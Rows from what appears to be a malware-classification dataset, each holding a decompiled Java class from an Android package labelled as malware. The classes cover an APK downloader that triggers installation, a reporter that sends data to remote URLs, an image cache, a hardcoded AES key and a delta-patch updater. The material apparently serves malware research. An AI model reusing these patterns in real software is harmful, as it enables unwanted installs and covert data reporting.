intent.addFlags(268435456);     intent.setDataAndType(Uri.fromFile(new File(this.b)),""application/vnd.android.package-archive"");     notification.setLatestEventInfo(DownloadingService.this.r,com.seleuco.common.b.w(DownloadingService.this.r),com.seleuco.common.a.p,PendingIntent.getActivity(DownloadingService.this.r,0,intent,134217728));     notification.flags=16;     DownloadingService.this.p.notify(this.a + 1,notification);     if (DownloadingService.b(DownloadingService.this.r)) {       DownloadingService.this.p.cancel(this.a + 1);       DownloadingService.this.r.startActivity(intent);     }     Bundle bundle2=new Bundle();     bundle2.putString(DownloadingService.l,this.b);     Message obtain2=Message.obtain();     obtain2.what=5;     obtain2.arg1=1;     obtain2.arg2=this.a;     obtain2.setData(bundle2);     try {       if (DownloadingService.v.get(this.d) != null) {         ((Messenger)DownloadingService.v.get(this.d)).send(obtain2);       }       DownloadingService.this.a(this.a);     }  catch (    RemoteException e2) {       DownloadingService.this.a(this.a);     }   } } class e implements DownloadingService.a {   final DownloadingService a;   public e(  DownloadingService downloadingService){     this.a=downloadingService;   }   @Override public void a(  int i){     Notification a;     int i2=0;     if (DownloadingService.w.containsKey(Integer.valueOf(i))) {       DownloadingService.d dVar=(DownloadingService.d)DownloadingService.w.get(Integer.valueOf(i));       long[] jArr=dVar.f;       if (jArr != null && jArr[1] > 0 && (i2=(int)((((float)jArr[0]) / ((float)jArr[1])) * 100.0f)) > 100) {         i2=99;       }       a=this.a.a(dVar.e,i,i2);       dVar.b=a;       this.a.p.notify(i,a);     }   }   @Override public void a(  int i,  int i2){     if (DownloadingService.w.containsKey(Integer.valueOf(i))) {       DownloadingService.d dVar=(DownloadingService.d)DownloadingService.w.get(Integer.valueOf(i));       a.C0001a c0001a=dVar.e;       Notification notification=dVar.b;       notification.contentView.setProgressBar(com.seleuco.common.a.a.c(this.a.r),100,i2,false);       notification.contentView.setTextViewText(com.seleuco.common.a.a.b(this.a.r),String.valueOf(i2) + ""%"");       this.a.p.notify(i,notification);       Log.c(DownloadingService.o,String.format(""%3$10s Notification: mNotificationId = %1$15s\t|\tprogress = %2$15s"",Integer.valueOf(i),Integer.valueOf(i2),c0001a.b));     }   }   @Override public void a(  int i,  String str){     DownloadingService.d dVar;     if (DownloadingService.w.containsKey(Integer.valueOf(i)) && (dVar=(DownloadingService.d)DownloadingService.w.get(Integer.valueOf(i))) != null) {       a.C0001a c0001a=dVar.e;       dVar.b.contentView.setTextViewText(com.seleuco.common.a.a.b(this.a.r),String.valueOf(100) + ""%"");       c.a(this.a.r).a(c0001a.a,c0001a.f148c,100);       Bundle bundle=new Bundle();       bundle.putString(""filename"",str);       if (c0001a.a.equalsIgnoreCase(""delta_update"")) {         Message obtain=Message.obtain();         obtain.what=6;         obtain.arg1=1;         obtain.obj=c0001a;         obtain.arg2=i;         obtain.setData(bundle);         this.a.s.sendMessage(obtain);         return;       }       Message obtain2=Message.obtain();       obtain2.what=5;       obtain2.arg1=1;       obtain2.obj=c0001a;       obtain2.arg2=i;       obtain2.setData(bundle);       this.a.s.sendMessage(obtain2);       Message obtain3=Message.obtain();       obtain3.what=5;       obtain3.arg1=1;       obtain3.arg2=i;       obtain3.setData(bundle);       try {         if (DownloadingService.v.get(c0001a) != null) {           ((Messenger)DownloadingService.v.get(c0001a)).send(obtain3);         }         this.a.a(i);       }  catch (      RemoteException e) {         this.a.a(i);       }     }   }   @Override public void a(  int i,  Exception exc){     if (DownloadingService.w.containsKey(Integer.valueOf(i))) {       DownloadingService.d dVar=(DownloadingService.d)DownloadingService.w.get(Integer.valueOf(i));       a.C0001a c0001a=dVar.e;       Notification notification=dVar.b;       notification.contentView.setTextViewText(com.seleuco.common.a.a.d(this.a.r),c0001a.b + com.seleuco.common.a.l);       this.a.p.notify(i,notification);       this.a.a(i);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\f.code","class f extends BroadcastReceiver {   final DownloadingService a;   public f(  DownloadingService downloadingService){     this.a=downloadingService;   }   @Override public void onReceive(  Context context,  Intent intent){     this.a.a(context,intent);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\g.code","public class g implements Runnable {   final String a;   final DownloadingService b;   public g(  DownloadingService downloadingService,  String str){     this.b=downloadingService;     this.a=str;   }   @Override public void run(){     Toast.makeText(this.b.r,this.a,0).show();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\h.code","public class h implements Runnable {   final DownloadingService a;   public h(  DownloadingService downloadingService){     this.a=downloadingService;   }   @Override public void run(){     Boolean unused=DownloadingService.y=false;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\i.code","public final class i implements Runnable {   final String[] a;   final boolean b;   final Map f151c;   public i(  String[] strArr,  boolean z,  Map map){     this.a=strArr;     this.b=z;     this.f151c=map;   }   @Override public void run(){     HttpResponse execute;     int nextInt=new Random().nextInt(1000);     if (this.a == null) {       Log.a(DownloadingService.o,nextInt + ""service report: urls is null"");       return;     }     for (    String str : this.a) {       String a=com.seleuco.common.util.g.a();       String str2=a.split("" "")[0];       String str3=a.split("" "")[1];       long currentTimeMillis=System.currentTimeMillis();       StringBuilder sb=new StringBuilder(str);       sb.append(""&data="" + str2);       sb.append(""&time="" + str3);       sb.append(""&ts="" + currentTimeMillis);       if (this.b) {         sb.append(""&action_type=1"");       }  else {         sb.append(""&action_type=-2"");       }       if (this.f151c != null) {         for (        String str4 : this.f151c.keySet()) {           sb.append(""&"" + str4 + ""=""+ ((String)this.f151c.get(str4)));         }       }       try {         Log.a(DownloadingService.o,nextInt + "": service report:\tget: "" + sb.toString());         HttpGet httpGet=new HttpGet(sb.toString());         BasicHttpParams basicHttpParams=new BasicHttpParams();         HttpConnectionParams.setConnectionTimeout(basicHttpParams,10000);         HttpConnectionParams.setSoTimeout(basicHttpParams,20000);         execute=new DefaultHttpClient(basicHttpParams).execute(httpGet);         Log.a(DownloadingService.o,nextInt + "": service report:status code:  "" + execute.getStatusLine().getStatusCode());       }  catch (      ClientProtocolException e) {         Log.c(DownloadingService.o,nextInt + "": service report:\tClientProtocolException,Failed to send message."" + str,e);       } catch (      IOException e2) {         Log.c(DownloadingService.o,nextInt + "": service report:\tIOException,Failed to send message."" + str,e2);       }       if (execute.getStatusLine().getStatusCode() == 200) {         return;       }     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\j.code","public class j implements Runnable {   final DownloadingService.b a;   public j(  DownloadingService.b bVar){     this.a=bVar;   }   @Override public void run(){     Context context;     DownloadingService downloadingService=DownloadingService.this;     context=this.a.b;     Toast.makeText(downloadingService,com.seleuco.common.a.c.h(context),0).show();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\k.code","public interface k {   void a();   void a(  int i);   void a(  int i,  int i2,  String str); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\l.code","public class l {   public static final String a=""pause"";   public static final String b=""continue"";   public static final String f152c=""cancel"";   public static final String d=""com.seleuco.intent.DOWNLOAD"";   public static final String e=""com.seleuco.broadcast.download.msg"";   public static String a(  int i,  String str){     if (i == 0) {       return null;     }     return (i + """") + "":"" + str;   }   public static int a(  a.C0001a c0001a){     int currentTimeMillis=(int)System.currentTimeMillis();     if (currentTimeMillis < 0) {       return -currentTimeMillis;     }     return currentTimeMillis;   }   public static PendingIntent a(  Context context,  String str){     Intent intent=new Intent(d);     intent.addFlags(1073741824);     intent.putExtra(e,str);     return PendingIntent.getBroadcast(context,str.hashCode(),intent,134217728);   }   public static PendingIntent b(  Context context,  String str){     Intent intent=new Intent(context,(Class<?>)DownloadingService.class);     intent.putExtra(e,str);     return PendingIntent.getService(context,str.hashCode(),intent,134217728);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\m.code","public class m extends r {   private static final String a=m.class.getName(); public interface a {     void a();     void a(    o.a aVar);   }   public o.a a(  n nVar){     o oVar=(o)a(nVar,o.class);     return oVar == null ? o.a.FAIL : oVar.a;   }   public void a(  n nVar,  a aVar){     try {       new b(nVar,aVar).execute(new Integer[0]);     }  catch (    Exception e) {       Log.b(a,"""",e);       if (aVar != null) {         aVar.a(o.a.FAIL);       }     }   } private class b extends AsyncTask<Integer,Integer,o.a> {     private n b;     private a f153c;     public b(    n nVar,    a aVar){       this.b=nVar;       this.f153c=aVar;     }     @Override protected void onPreExecute(){       if (this.f153c != null) {         this.f153c.a();       }     }     @Override public void onPostExecute(    o.a aVar){       if (this.f153c != null) {         this.f153c.a(aVar);       }     }     @Override public o.a doInBackground(    Integer... numArr){       return m.this.a(this.b);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\n.code","public abstract class n extends s {   public n(){     super("""");   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\o.code","public class o extends t {   public a a;   public enum a {  SUCCESS,   FAIL}   public o(  JSONObject jSONObject){     super(jSONObject);     if (""ok"".equalsIgnoreCase(jSONObject.optString(""status"")) || ""ok"".equalsIgnoreCase(jSONObject.optString(""success""))) {       this.a=a.SUCCESS;     }  else {       this.a=a.FAIL;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\p.code","public class p {   private static final long f155c=104857600;   private static final long d=10485760;   private static Thread f;   private static final String b=p.class.getName();   public static boolean a=false;   private static final Map<ImageView,String> e=Collections.synchronizedMap(new WeakHashMap()); public interface a {     void a(    o.a aVar);     void a(    b bVar);   }   public enum b {  BIND_FORM_CACHE,   BIND_FROM_NET}   private static String b(  String str){     int lastIndexOf=str.lastIndexOf(""."");     String str2="""";     if (lastIndexOf >= 0) {       str2=str.substring(lastIndexOf);     }     return com.seleuco.common.util.g.a(str) + str2;   }   public static String a(  Context context,  String str){     File file;     String canonicalPath;     long j;     if (com.seleuco.common.util.g.d(str)) {       return null;     }     try {       String str2=b(str) + "".tmp"";       if (com.seleuco.common.b.b()) {         canonicalPath=Environment.getExternalStorageDirectory().getCanonicalPath();         j=f155c;       }  else {         canonicalPath=context.getCacheDir().getCanonicalPath();         j=d;       }       File file2=new File(canonicalPath + com.seleuco.common.a.a);       if (file2.exists()) {         if (b(file2.getCanonicalFile()) > j) { synchronized (f) {             if (f == null) {               f=new Thread(new q(file2));               f.start();             }           }         }       }  else       if (!file2.mkdirs()) {         Log.b(b,""Failed to create directory"" + file2.getAbsolutePath() + "". Check permission. Make sure WRITE_EXTERNAL_STORAGE is added in your Manifest.xml"");       }       file=new File(file2,str2);       try {         file.createNewFile();         FileOutputStream fileOutputStream=new FileOutputStream(file);         InputStream inputStream=(InputStream)new URL(str).openConnection().getContent();         byte[] bArr=new byte[4096];         while (true) {           int read=inputStream.read(bArr);           if (read != -1) {             fileOutputStream.write(bArr,0,read);           }  else {             fileOutputStream.flush();             inputStream.close();             fileOutputStream.close();             File file3=new File(file.getParent(),file.getName().replace("".tmp"",""""));             file.renameTo(file3);             Log.a(b,""download img["" + str + ""]  to ""+ file3.getCanonicalPath());             return file3.getCanonicalPath();           }         }       }  catch (      Exception e2) {         e=e2;         Log.a(b,e.getStackTrace().toString() + ""\t url:\t"" + com.seleuco.common.util.g.a+ str);         if (file != null && file.exists()) {           file.deleteOnExit();         }         return null;       }     }  catch (    Exception e3) {       e=e3;       file=null;       Log.a(b,e.getStackTrace().toString() + ""\t url:\t"" + com.seleuco.common.util.g.a+ str);       if (file != null) {         file.deleteOnExit();       }       return null;     }   }   private static long b(  File file){     long length;     long j=0;     if (file == null || !file.exists() || !file.isDirectory()) {       return 0L;     }     Stack stack=new Stack();     stack.clear();     stack.push(file);     while (true) {       long j2=j;       if (!stack.isEmpty()) {         File[] listFiles=((File)stack.pop()).listFiles();         j=j2;         int i=0;         while (i < listFiles.length) {           if (listFiles[i].isDirectory()) {             stack.push(listFiles[i]);             length=j;           }  else {             length=listFiles[i].length() + j;           }           i++;           j=length;         }       }  else {         return j2;       }     }   }   public static void c(  File file){     if (file != null && file.exists() && file.canWrite() && file.isDirectory()) {       File[] listFiles=file.listFiles();       for (int i=0; i < listFiles.length; i++) {         if (listFiles[i].isDirectory()) {           c(listFiles[i]);         }  else         if (new Date().getTime() - listFiles[i].lastModified() > 1800) {           listFiles[i].delete();         }       }     }   }   protected static File b(  Context context,  String str) throws IOException {     String canonicalPath;     String b2=b(str);     if (com.seleuco.common.b.b()) {       canonicalPath=Environment.getExternalStorageDirectory().getCanonicalPath();     }  else {       canonicalPath=context.getCacheDir().getCanonicalPath();     }     File file=new File(new File(canonicalPath + com.seleuco.common.a.a),b2);     if (file.exists()) {       return file;     }     return null;   }   public static void a(  Context context,  ImageView imageView,  String str,  boolean z){     a(context,imageView,str,z,null,null,false);   }   public static void a(  Context context,  ImageView imageView,  String str,  boolean z,  a aVar){     a(context,imageView,str,z,aVar,null,false);   }   public static void a(  Context context,  ImageView imageView,  String str,  boolean z,  a aVar,  Animation animation){     a(context,imageView,str,z,aVar,null,false);   }   public static void a(  Context context,  ImageView imageView,  String str,  boolean z,  a aVar,  Animation animation,  boolean z2){     if (imageView != null) {       e.put(imageView,str);       try {         File b2=b(context,str);         if (b2 != null && b2.exists() && !a) {           if (aVar != null) {             aVar.a(b.BIND_FORM_CACHE);           }           Drawable c2=c(b2.getAbsolutePath());           if (c2 == null) {             b2.delete();           }           b(context,imageView,c2,z,aVar,animation,z2,str);           return;         }         new c(context,imageView,str,b.BIND_FROM_NET,null,z,aVar,animation,z2).execute(new Object[0]);       }  catch (      Exception e2) {         Log.b(b,"""",e2);         if (aVar != null) {           aVar.a(o.a.FAIL);         }       }     }   }   private static boolean a(  ImageView imageView,  String str){     String str2=e.get(imageView);     return (str2 == null || str2.equals(str)) ? false : true;   }   public static synchronized void b(  Context context,  ImageView imageView,  Drawable drawable,  boolean z,  a aVar,  Animation animation,  boolean z2,  String str){ synchronized (p.class) {       if (z2 && drawable != null) {         try {           drawable=new BitmapDrawable(a(((BitmapDrawable)drawable).getBitmap()));         }  catch (        Exception e2) {           Log.b(b,""bind failed"",e2);           if (aVar != null) {             aVar.a(o.a.FAIL);           }         }       }       if (drawable == null || imageView == null) {         if (aVar != null) {           aVar.a(o.a.FAIL);         }         Log.e(b,""bind drawable failed. drawable ["" + drawable + ""]  imageView[+""+ imageView+ ""+]"");       }  else       if (a(imageView,str)) {         if (aVar != null) {           aVar.a(o.a.FAIL);         }       }  else {         if (z) {           imageView.setBackgroundDrawable(drawable);         }  else {           imageView.setImageDrawable(drawable);         }         if (animation != null) {           imageView.startAnimation(animation);         }         if (aVar != null) {           aVar.a(o.a.SUCCESS);         }       }     }   } public static class c extends AsyncTask<Object,Integer,Drawable> {     private Context a;     private String b;     private ImageView f157c;     private b d;     private boolean e;     private a f;     private Animation g;     private boolean h;     private File i;     public c(    Context context,    ImageView imageView,    String str,    b bVar,    File file,    boolean z,    a aVar,    Animation animation,    boolean z2){       this.i=file;       this.a=context;       this.b=str;       this.f=aVar;       this.d=bVar;       this.e=z;       this.g=animation;       this.f157c=imageView;       this.h=z2;     }     @Override protected void onPreExecute(){       super.onPreExecute();       if (this.f != null) {         this.f.a(this.d);       }     }     @Override public void onPostExecute(    Drawable drawable){       p.b(this.a,this.f157c,drawable,this.e,this.f,this.g,this.h,this.b);     }     @Override public Drawable doInBackground(    Object... objArr){       if (p.a) {         try {           Thread.sleep(3000L);         }  catch (        InterruptedException e) {           e.printStackTrace();         }       }       if (this.i != null && this.i.exists()) {         Drawable c2=p.c(this.i.getAbsolutePath());         if (c2 == null) {           this.i.delete();         }         Log.c(p.b,""get drawable from cacheFile."");         return c2;       }       try {         p.a(this.a,this.b);         File b=p.b(this.a,this.b);         Drawable c3=(b == null || !b.exists()) ? null : p.c(b.getAbsolutePath());         Log.c(p.b,""get drawable from net else file."");         return c3;       }  catch (      Exception e2) {         Log.e(p.b,e2.toString(),e2);         return null;       }     }   }   public static Drawable c(  String str){     try {       return Drawable.createFromPath(str);     }  catch (    OutOfMemoryError e2) {       Log.e(b,""Resutil fetchImage OutOfMemoryError:"" + e2.toString());       return null;     }   }   private static Bitmap a(  Bitmap bitmap){     try {       Bitmap createBitmap=Bitmap.createBitmap(bitmap.getWidth(),bitmap.getHeight(),Bitmap.Config.ARGB_8888);       Canvas canvas=new Canvas(createBitmap);       Paint paint=new Paint();       Rect rect=new Rect(0,0,bitmap.getWidth(),bitmap.getHeight());       RectF rectF=new RectF(rect);       paint.setAntiAlias(true);       canvas.drawARGB(0,0,0,0);       paint.setColor(-12434878);       canvas.drawRoundRect(rectF,bitmap.getWidth() / 6,bitmap.getHeight() / 6,paint);       paint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.SRC_IN));       canvas.drawBitmap(bitmap,rect,rect,paint);       bitmap.recycle();       return createBitmap;     }  catch (    OutOfMemoryError e2) {       Log.e(b,""Cant`t create round corner bitmap. [OutOfMemoryError] "");       return null;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\q.code","public final class q implements Runnable {   final File a;   public q(  File file){     this.a=file;   }   @Override public void run(){     p.c(this.a);     Thread unused=p.f=null;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\r.code","public class r {   private static final String a=r.class.getName();   private Map<String,String> b;   public <T extends t>T a(  s sVar,  Class<T> cls){     JSONObject a2;     String trim=sVar.c().trim();     b(trim);     if (s.f158c.equals(trim)) {       a2=a(sVar.b());     }  else {       a2=s.b.equals(trim) ? a(sVar.d,sVar.a()) : null;     }     if (a2 == null) {       return null;     }     try {       return cls.getConstructor(JSONObject.class).newInstance(a2);     }  catch (    IllegalAccessException e) {       Log.b(a,""IllegalAccessException"",e);       return null;     } catch (    IllegalArgumentException e2) {       Log.b(a,""IllegalArgumentException"",e2);       return null;     } catch (    InstantiationException e3) {       Log.b(a,""InstantiationException"",e3);       return null;     } catch (    NoSuchMethodException e4) {       Log.b(a,""NoSuchMethodException"",e4);       return null;     } catch (    SecurityException e5) {       Log.b(a,""SecurityException"",e5);       return null;     } catch (    InvocationTargetException e6) {       Log.b(a,""InvocationTargetException"",e6);       return null;     }   }   private JSONObject a(  String str,  JSONObject jSONObject){     String jSONObject2=jSONObject.toString();     int nextInt=new Random().nextInt(1000);     Log.c(a,nextInt + "":\trequest: "" + str+ com.seleuco.common.util.g.a+ jSONObject2);     HttpPost httpPost=new HttpPost(str);     DefaultHttpClient defaultHttpClient=new DefaultHttpClient(b());     try {       if (a()) {         byte[] a2=com.seleuco.common.util.f.a(""content="" + jSONObject2,Charset.defaultCharset().toString());         httpPost.addHeader(""Content-Encoding"",""deflate"");         httpPost.setEntity(new InputStreamEntity(new ByteArrayInputStream(a2),a2.length));       }  else {         ArrayList arrayList=new ArrayList(1);         arrayList.add(new BasicNameValuePair(""content"",jSONObject2));         httpPost.setEntity(new UrlEncodedFormEntity(arrayList,com.seleuco.common.util.e.f));       }       HttpResponse execute=defaultHttpClient.execute(httpPost);       if (execute.getStatusLine().getStatusCode() == 200) {         HttpEntity entity=execute.getEntity();         if (entity == null) {           return null;         }         InputStream content=entity.getContent();         Header firstHeader=execute.getFirstHeader(""Content-Encoding"");         String a3=a((firstHeader == null || !firstHeader.getValue().equalsIgnoreCase(""deflate"")) ? content : new InflaterInputStream(content));         Log.a(a,nextInt + "":\tresponse: "" + com.seleuco.common.util.g.a+ a3);         if (a3 == null) {           return null;         }         return new JSONObject(a3);       }       Log.c(a,nextInt + "":\tFailed to send message. StatusCode = "" + execute.getStatusLine().getStatusCode()+ com.seleuco.common.util.g.a+ str);       return null;     }  catch (    ClientProtocolException e) {       Log.c(a,nextInt + "":\tClientProtocolException,Failed to send message."" + str,e);       return null;     } catch (    IOException e2) {       Log.c(a,nextInt + "":\tIOException,Failed to send message."" + str,e2);       return null;     } catch (    JSONException e3) {       Log.c(a,nextInt + "":\tIOException,Failed to send message."" + str,e3);       return null;     }   }   public boolean a(){     return false;   }   private static String a(  InputStream inputStream){     BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(inputStream),8192);     StringBuilder sb=new StringBuilder();     while (true) {       try {         try {           String readLine=bufferedReader.readLine();           if (readLine != null) {             sb.append(readLine + ""\n"");           }  else {             try {               inputStream.close();               return sb.toString();             }  catch (            IOException e) {               Log.b(a,""Caught IOException in convertStreamToString()"",e);               return null;             }           }         }  catch (        Throwable th) {           try {             inputStream.close();             throw th;           }  catch (          IOException e2) {             Log.b(a,""Caught IOException in convertStreamToString()"",e2);             return null;           }         }       }  catch (      IOException e3) {         Log.b(a,""Caught IOException in convertStreamToString()"",e3);         try {           inputStream.close();           return null;         }  catch (        IOException e4) {           Log.b(a,""Caught IOException in convertStreamToString()"",e4);           return null;         }       }     }   }   private JSONObject a(  String str){     InputStream inputStream;     int nextInt=new Random().nextInt(1000);     try {       String property=System.getProperty(""line.separator"");       if (str.length() <= 1) {         Log.b(a,nextInt + "":\tInvalid baseUrl."");         return null;       }       Log.a(a,nextInt + "":\tget: "" + str);       HttpGet httpGet=new HttpGet(str);       if (this.b != null && this.b.size() > 0) {         for (        String str2 : this.b.keySet()) {           httpGet.addHeader(str2,this.b.get(str2));         }       }       HttpResponse execute=new DefaultHttpClient(b()).execute(httpGet);       if (execute.getStatusLine().getStatusCode() == 200) {         HttpEntity entity=execute.getEntity();         if (entity != null) {           InputStream content=entity.getContent();           Header firstHeader=execute.getFirstHeader(""Content-Encoding"");           if (firstHeader != null && firstHeader.getValue().equalsIgnoreCase(""gzip"")) {             Log.a(a,nextInt + ""  Use GZIPInputStream get data...."");             inputStream=new GZIPInputStream(content);           }  else           if (firstHeader == null || !firstHeader.getValue().equalsIgnoreCase(""deflate"")) {             inputStream=content;           }  else {             Log.a(a,nextInt + ""  Use InflaterInputStream get data...."");             inputStream=new InflaterInputStream(content);           }           String a2=a(inputStream);           Log.a(a,nextInt + "":\tresponse: "" + property+ a2);           if (a2 == null) {             return null;           }           return new JSONObject(a2);         }       }  else {         Log.c(a,nextInt + "":\tFailed to send message. StatusCode = "" + execute.getStatusLine().getStatusCode()+ com.seleuco.common.util.g.a+ str);       }       return null;     }  catch (    ClientProtocolException e) {       Log.c(a,nextInt + "":\tClientProtocolException,Failed to send message."" + str,e);       return null;     } catch (    Exception e2) {       Log.c(a,nextInt + "":\tIOException,Failed to send message."" + str,e2);       return null;     }   }   private HttpParams b(){     BasicHttpParams basicHttpParams=new BasicHttpParams();     HttpConnectionParams.setConnectionTimeout(basicHttpParams,10000);     HttpConnectionParams.setSoTimeout(basicHttpParams,20000);     HttpProtocolParams.setUserAgent(basicHttpParams,System.getProperty(""http.agent""));     return basicHttpParams;   }   public r a(  Map<String,String> map){     this.b=map;     return this;   }   private void b(  String str){     if (com.seleuco.common.util.g.d(str) || !(s.f158c.equals(str.trim()) ^ s.b.equals(str.trim()))) {       throw new RuntimeException(""éªŒè¯�è¯·æ±‚æ–¹å¼�å¤±è´¥["" + str + ""]"");     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\s.code","public abstract class s {   protected static String b=""POST"";   protected static String f158c=""GET"";   protected String d;   public abstract JSONObject a();   public abstract String b();   public String c(){     return b;   }   public s(  String str){     this.d=str;   }   public void a(  String str){     this.d=str;   }   public String d(){     return this.d;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.net\t.code","public abstract class t {   public t(  JSONObject jSONObject){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.util\a.code","public class a {   public static byte[] a(  String str){     return a(str,e.a);   }   public static byte[] b(  String str){     return a(str,e.b);   }   public static byte[] c(  String str){     return a(str,e.f160c);   }   public static byte[] d(  String str){     return a(str,e.d);   }   public static byte[] e(  String str){     return a(str,e.e);   }   public static byte[] f(  String str){     return a(str,e.f);   }   public static byte[] a(  String str,  String str2){     if (str == null) {       return null;     }     try {       return str.getBytes(str2);     }  catch (    UnsupportedEncodingException e) {       throw a(str2,e);     }   }   private static IllegalStateException a(  String str,  UnsupportedEncodingException unsupportedEncodingException){     return new IllegalStateException(str + "": "" + unsupportedEncodingException);   }   public static String a(  byte[] bArr,  String str){     if (bArr == null) {       return null;     }     try {       return new String(bArr,str);     }  catch (    UnsupportedEncodingException e) {       throw a(str,e);     }   }   public static String a(  byte[] bArr){     return a(bArr,e.a);   }   public static String b(  byte[] bArr){     return a(bArr,e.b);   }   public static String c(  byte[] bArr){     return a(bArr,e.f160c);   }   public static String d(  byte[] bArr){     return a(bArr,e.d);   }   public static String e(  byte[] bArr){     return a(bArr,e.e);   }   public static String f(  byte[] bArr){     return a(bArr,e.f);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.util\b.code","public class b {   private static byte[] a=""uLi4/f4+Pb39.T19"".getBytes();   private static byte[] b=""nmeug.f9/Om+L823"".getBytes();   public static String a(  String str,  String str2) throws Exception {     Cipher cipher=Cipher.getInstance(""AES/CBC/PKCS5Padding"");     cipher.init(1,new SecretKeySpec(a,""AES""),new IvParameterSpec(b));     return c.d(cipher.doFinal(str.getBytes(str2)));   }   public static String b(  String str,  String str2) throws Exception {     Cipher cipher=Cipher.getInstance(""AES/CBC/PKCS5Padding"");     cipher.init(2,new SecretKeySpec(a,""AES""),new IvParameterSpec(b));     return new String(cipher.doFinal(c.b(str)),str2);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.util\c.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3eda4c79"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.util\d.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3cb6c123"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.util\DeltaUpdate.code","public class DeltaUpdate {   private static boolean a=false;   private static final String b=""bspatch"";   public static native int bspatch(  String str,  String str2,  String str3);   public static boolean a(){     return a;   }   public static int a(  String str,  String str2,  String str3){     return bspatch(str,str2,str3);   }   public static String a(  Context context){     return context.getApplicationInfo().sourceDir;   }   public static String b(  Context context){     String a2=a(context);     return !new File(a2).exists() ? """" : g.a(new File(a2));   } static {     try {       System.loadLibrary(b);       a=true;     }  catch (    UnsatisfiedLinkError e) {       a=false;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.util\e.code","public class e {   public static final String a=""ISO-8859-1"";   public static final String b=""US-ASCII"";   public static final String f160c=""UTF-16"";   public static final String d=""UTF-16BE"";   public static final String e=""UTF-16LE"";   public static final String f=""UTF-8""; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.common.util\f.code","public class f {   public static int a;   public static byte[] a(  String str,  String str2) throws IOException {     ByteArrayOutputStream byteArrayOutputStream;     Throwable th;     if (g.d(str)) {       return null;     }     Deflater deflater=new Deflater();     deflater.setInput(str.getBytes(str2));     deflater.finish();     byte[] bArr=new byte[8192];     a=0;     try {       byteArrayOutputStream=new ByteArrayOutputStream();       while (!deflater.finished()) {         try {           int deflate=deflater.deflate(bArr);           a+=deflate;           byteArrayOutputStream.write(bArr,0,deflate);         }  catch (        Throwable th2) {           th=th2;           if (byteArrayOutputStream != null) {             byteArrayOutputStream.close();           }           throw th;         }       }       deflater.end();       if (byteArrayOutputStream != null) {         byteArrayOutputStream.close();       }       return byteArrayOutputStream.toByteArray();     }  catch (    Throwable th3) {       byteArrayOutputStream=null;       th=th3;     }   }   public static String a(  byte[] bArr,  String str) throws UnsupportedEncodingException, DataFormatException {     if (bArr == null || bArr.length == 0) {       return null;     }     Inflater inflater=new Inflater();     byte[] bArr2=new byte[100];     inflater.setInput(bArr,0,bArr.length);     StringBuilder sb=new StringBuilder();     while (!inflater.needsInput()) {       sb.append(new String(bArr2,0,inflater.inflate(bArr2),str));     }     inflater.end();     return sb.toString();   } } "
